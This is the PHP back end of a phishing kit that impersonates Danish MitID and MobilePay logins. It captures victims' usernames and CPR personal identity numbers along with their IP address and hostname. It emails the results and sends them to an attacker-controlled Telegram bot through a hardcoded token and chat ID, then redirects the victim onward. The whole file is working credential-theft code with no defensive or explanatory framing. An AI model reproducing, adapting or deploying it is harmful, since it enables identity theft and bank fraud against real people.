<?php

session_start();

$user=$_POST["user"];
$cpr=$_POST["cpr"];


$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['user'] = $user;
        $_SESSION['cpr'] = $cpr;




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|Log MobilePay |----------|\n";
$message .= "Mobile  : ".$_SESSION['mpay']."\n";
$message .= "|----------|Log MitID |----------|\n";
$message .= "User  : ".$_SESSION['user']."\n";
$message .= "CPR  : ".$_SESSION['cpr']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-MitID>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6994118018:AAHgrLIc7x7AL1vPSf3jMTitc3954IsygEI";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=979803173&text=" . urlencode($message)."" );
header("location:load.php?vc?__event=card&service_id=top_card=IL")
?>